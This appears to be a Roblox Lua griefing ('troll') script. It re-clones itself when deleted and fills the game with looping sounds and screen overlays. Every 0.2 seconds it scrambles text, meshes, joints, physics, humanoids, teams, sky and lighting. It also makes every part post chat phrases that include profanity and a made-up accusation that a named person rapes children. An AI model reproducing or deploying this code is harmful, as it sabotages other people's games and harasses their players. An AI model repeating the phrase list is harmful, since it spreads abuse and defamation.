local Settings={["Un_Removable"]= "On"}
local function mFloor(x) return x - x % 1 end
local Un_Removable = tostring(Settings["Un_Removable"]):lower() == "on"
if Un_Removable then
Game.Workspace.DescendantRemoving:connect(function(Child)
if not Remove_At_Will and Child == script.Parent then
script.Parent:Clone().Parent = script.Parent.Parent
end
end)
end 
---------------------------------------------------------------

function FindAllParts(class, ignore)
local PartTable = {}
local function FindPartsIn(object, ign)
for i,v in pairs(object:GetChildren()) do
if v ~= ign then
if v:IsA(class) then
table.insert(PartTable, v)
else
FindPartsIn(v, ign)
end
end
end
end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
for _,b in pairs(v.PlayerGui:GetChildren()) do
if v ~= ignore then
if v:IsA(class) then
table.insert(PartTable, v)
else
FindPartsIn(v, ignore)
end
end
end
end
for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
if v ~= ignore then
if v:IsA(class) then
table.insert(PartTable, v)
else
FindPartsIn(v, ignore)
end
end
end
for i,v in pairs(game:GetService("StarterGui"):GetChildren()) do
if v ~= ignore then
if v:IsA(class) then
table.insert(PartTable, v)
else
FindPartsIn(v, ignore)
end
end
end
for i,v in pairs(game:GetService("Teams"):GetChildren()) do
if v ~= ignore then
if v:IsA(class) then
table.insert(PartTable, v)
else
FindPartsIn(v, ignore)
end
end
end
return PartTable
end

function RandomString(len)
local Chars = {}
for Loop = 0, 255 do
Chars[Loop+1] = string.char(Loop)
end
local String = ""
for Loop = 1, len do
String = String .. Chars[math.random(35, 131)]
end
return String
end

function RandomPic()
local Pictures = {
"http://www.roblox.com/asset/?id=45120559",
"http://www.roblox.com/asset/?id=63409741",
"http://www.roblox.com/asset/?id=63430330",
"http://www.roblox.com/asset/?id=63432546",
"http://www.roblox.com/asset/?id=63433310",
"http://www.roblox.com/asset/?id=63445245",
"http://www.roblox.com/asset/?id=63448898"
}
return Pictures[math.random(1, #Pictures)]
end

function RandomSound()
Sounds = {
"http://www.roblox.com/asset/?id=9650822",
"http://www.roblox.com/asset/?id=8610025",
"http://www.roblox.com/asset/?id=1372260",
"http://www.roblox.com/asset/?id=27697713",
"http://www.roblox.com/asset/?id=27697735",
"http://www.roblox.com/asset/?id=27697743",
"http://www.roblox.com/asset/?id=1372262",
"http://www.roblox.com/asset/?id=1015394",
"http://www.roblox.com/asset/?id=1077604",
"http://www.roblox.com/asset/?id=1034065",
"http://www.roblox.com/asset/?id=1280414",
"http://www.roblox.com/asset/?id=1280473",
"http://www.roblox.com/asset/?id=1372257",
"http://www.roblox.com/asset/?id=27697277",
"http://www.roblox.com/asset/?id=27697267",
"http://www.roblox.com/asset/?id=1372257",
"http://www.roblox.com/asset/?id=2027611",
"http://www.roblox.com/asset/?id=11060062",
"http://www.roblox.com/asset/?id=45819151",
"http://www.roblox.com/asset/?id=29445395",
"http://www.roblox.com/asset/?id=29445378",
"http://www.roblox.com/asset/?id=29445358",
"http://www.roblox.com/asset/?id=29445339",
"http://www.roblox.com/asset/?id=29445305",
"http://www.roblox.com/asset/?id=24111685",
"http://www.roblox.com/asset/?id=24111782",
"http://www.roblox.com/asset/?id=24111798",
"http://www.roblox.com/asset/?id=24111823",
"http://www.roblox.com/asset/?id=2036448",
"rbxasset://sounds//Victory.wav",
"http://www.roblox.com/asset/?id=19073176",
"http://roblox.com/asset/?id=2723457",
"http://www.roblox.com/asset/?id=11565378",
"http://www.roblox.com/asset/?id=31033396",
"http://www.roblox.com/asset/?id=28105371",
"http://www.roblox.com/asset/?id=25078999",
"http://www.roblox.com/asset/?id=28510547",
"rbxasset://sounds/uuhhh.wav",
"rbxasset://sounds/bass.wav"
}
return Sounds[math.random(1, #Sounds)]
end

function Troll(player)
local gui = Instance.new("ScreenGui", player.PlayerGui)
local img = Instance.new("ImageLabel", gui)
img.Size = UDim2.new(0.4, 0, 0.4, 0)
img.BackgroundTransparency = 1
coroutine.resume(coroutine.create(function()
while wait() do
gui.Parent = player.PlayerGui
img.Parent = gui
img.Size = UDim2.new(0.4, 0, 0.4, 0)
img.BackgroundTransparency = 1
end
end))
end

beginph = {
">:D",
"D:",
":'(",
":O",
"() <===8"
}

midph = {
" 0.o",
" :P",
" =]",
" xD",
" :)"
}

endph = {
" Herp",
" Dr.Haxs",
" What the !@#$! is this!",
" Telamon rapes little Girls",
" Like a Boss",
" Derp",
" Lawl",
" Hax!",
" HACKER",
" TrollFace Ftw?",
" You Suck Dicks",
" !@#$! you!"
}

function Phrase()
local beg = beginph[math.random(1, #beginph)]
local mid = midph[math.random(1, #midph)]
local endp = endph[math.random(1, #endph)]

return beg .. mid .. endp
end

coroutine.resume(coroutine.create(function()
for i = 0, 100 do
local sound = Instance.new("Sound", workspace)
sound.Volume = 1
sound.Pitch = math.random(-3000,3000)/1000
sound.Looped = true
sound.SoundId = RandomSound()
coroutine.resume(coroutine.create(function()
wait(1)
sound:Play()
end))
wait()
end
end))

for _,v in pairs(game:GetService("Players"):GetPlayers()) do
Troll(v)
end

game:GetService("Players").PlayerAdded:connect(function(player)
Troll(player)
end)

while wait(0.2) do
for _,v in pairs(FindAllParts("TextLabel")) do
pcall(function() v.Text = RandomString(10) end)
pcall(function() v.FontSize = math.random(0, 9) end)
pcall(function() v.Font = math.random(0, 2) end)
pcall(function() v.TextColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.BorderColor3 = Color3.new(math.random(), math.random(), math.random()) end)
end
for _,v in pairs(FindAllParts("TextButton")) do
pcall(function() v.Text = RandomString(10) end)
pcall(function() v.FontSize = math.random(0, 9) end)
pcall(function() v.Font = math.random(0, 2) end)
pcall(function() v.TextColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.Style = math.random(0, 2) end)
pcall(function() v.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.BorderColor3 = Color3.new(math.random(), math.random(), math.random()) end)
end
for _,v in pairs(FindAllParts("TextBox")) do
pcall(function() v.Text = RandomString(10) end)
pcall(function() v.FontSize = math.random(0, 9) end)
pcall(function() v.Font = math.random(0, 2) end)
pcall(function() v.TextColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.BorderColor3 = Color3.new(math.random(), math.random(), math.random()) end)
end
for _,v in pairs(FindAllParts("ImageLabel")) do
pcall(function() v.Image = "http://www.roblox.com/asset/?id=63430330" end)
pcall(function() v.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.BorderColor3 = Color3.new(math.random(), math.random(), math.random()) end)
end
for _,v in pairs(FindAllParts("ImageButton")) do
pcall(function() v.Image = "http://www.roblox.com/asset/?id=63430330" end)
pcall(function() v.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.BorderColor3 = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.Style = math.random(0, 2) end)
end
for _,v in pairs(FindAllParts("Decal")) do
pcall(function() v.Texture = RandomPic() end)
pcall(function() v.Face = math.random(0, 5) end)
end
for _,v in pairs(FindAllParts("Message")) do
pcall(function() v.Text = Phrase() end)
end
for _,v in pairs(FindAllParts("DataModelMesh")) do
pcall(function() v.Scale = Vector3.new(math.random(-600,600)/100,math.random(-600,600)/100,math.random(-600,600)/100) end)
pcall(function() v.VertexColor = Color3.new(math.random(), math.random(), math.random()) end)
end
for _,v in pairs(FindAllParts("SpecialMesh")) do
pcall(function() v.MeshType = math.random(0, 6) end)
end
for _,v in pairs(FindAllParts("BasePart")) do
pcall(function() v.BrickColor = BrickColor.random() end)
pcall(function() v.Transparency = 0 end)
pcall(function() v.Reflectance = 0 end)
pcall(function() if not v.Name == "Base" then v.CFrame = v.CFrame * CFrame.Angles(math.rad(math.random(0, 359)), math.rad(math.random(0, 359)), math.rad(math.random(0, 359))) end end)
local meshes = false
for _,m in pairs(v:GetChildren()) do
if m:IsA("DataModelMesh") then
meshes = true
end
end
if meshes == false then
Instance.new("SpecialMesh", v)
end
game:GetService("Chat"):Chat(v, Phrase(), math.random(0, 2))
end
for _,v in pairs(FindAllParts("StringValue")) do
pcall(function() v.Value = RandomString(50) end)
end
for _,v in pairs(FindAllParts("Fire")) do
pcall(function() v.Color = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.SecondaryColor = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.Heat = math.random(1, 20) end)
pcall(function() v.Size = math.random(1, 20) end)
pcall(function() v.Enabled = true end)
end
for _,v in pairs(FindAllParts("Smoke")) do
pcall(function() v.Color = Color3.new(math.random(), math.random(), math.random()) end)
pcall(function() v.Enabled = true end)
pcall(function() v.Size = math.random(1, 20) end)
pcall(function() v.RiseVelocity = math.random(1, 20) end)
pcall(function() v.Opacity = math.random() end)
end
for _,v in pairs(FindAllParts("BodyForce")) do
pcall(function() v.force = Vector3.new(math.random(-200, 200), math.random(-200, 200), math.random(-200, 200)) end)
end
for _,v in pairs(FindAllParts("BodyVelocity")) do
pcall(function() v.Velocity = Vector3.new(math.random(-200, 200), math.random(-200, 200), math.random(-200, 200)) end)
pcall(function() v.maxForce = Vector3.new(math.random(-200, 200), math.random(-200, 200), math.random(-200, 200)) end)
pcall(function() v.P = 14000 end)
end
for _,v in pairs(FindAllParts("BodyPosition")) do
pcall(function() v.maxForce = Vector3.new(math.random(-200, 200), math.random(-200, 200), math.random(-200, 200)) end)
pcall(function() v.P = 14000 end)
end
for _,v in pairs(FindAllParts("BodyGyro")) do
pcall(function() v.maxTorque = Vector3.new(math.random(-200, 200), math.random(-200, 200), math.random(-200, 200)) end)
pcall(function() v.P = 14000 end)
end
for _,v in pairs(FindAllParts("IntValue")) do
if v.Name ~= "leaderstats" then
pcall(function() v.Name = RandomString(math.random(3, 12)) end)
pcall(function() v.Value = math.random(-10000, 10000) end)
end
end
for _,v in pairs(FindAllParts("JointInstance")) do
pcall(function() v.C0 = CFrame.new(math.random(-500, 500)/100, math.random(-500, 500)/100, math.random(-500, 500)/100) * CFrame.Angles(math.rad(math.random(0, 359)), math.rad(math.random(0, 359)), math.rad(math.random(0, 359))) end)
pcall(function() v.C1 = CFrame.new(math.random(-500, 500)/100, math.random(-500, 500)/100, math.random(-500, 500)/100) end)
pcall(function() v.Name = Phrase() end)
end
for _,v in pairs(FindAllParts("Humanoid")) do
if math.random(1, 2) == 1 then
v.Sit = true
else
v.Jump = true
end
pcall(function() v.Name = Phrase() end)
end
for _,v in pairs(FindAllParts("Team")) do
pcall(function() v.Name = Phrase() end)
pcall(function() v.TeamColor = BrickColor.random() end)
pcall(function() v.Neutral = false end)
end



local sky = Instance.new("Sky", game:GetService("Lighting"))
sky.SkyboxBk = "http://www.roblox.com/asset/?id=45120559"
sky.SkyboxDn = "http://www.roblox.com/asset/?id=45120559"
sky.SkyboxFt = "http://www.roblox.com/asset/?id=45120559"
sky.SkyboxLf = "http://www.roblox.com/asset/?id=45120559"
sky.SkyboxRt = "http://www.roblox.com/asset/?id=45120559"
sky.SkyboxUp = "http://www.roblox.com/asset/?id=45120559"
sky.CelestialBodiesShown = false



game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
game.Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
game.Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
game.Lighting.ShadowColor = Color3.new(math.random(), math.random(), math.random())
end